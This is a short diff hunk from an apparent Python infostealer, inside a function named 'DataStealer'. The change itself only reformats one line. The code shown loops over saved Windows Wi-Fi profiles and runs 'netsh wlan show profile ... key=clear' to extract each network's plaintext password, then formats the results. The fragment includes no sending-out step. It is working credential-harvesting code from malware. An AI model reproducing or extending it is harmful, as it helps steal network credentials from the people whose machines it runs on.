@@ -216,9 +216,8 @@ def DataStealer():
 
         for i in profiles:
             try:
-                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8',
-                                                                                                               errors="backslashreplace").split(
-                    '\n')
+                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'
+                                                   ]).decode('utf-8', errors="backslashreplace").split('\n')
                 results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                 try:
                     sonuc = "{:<30}|  {:<}".format(i, results[0])
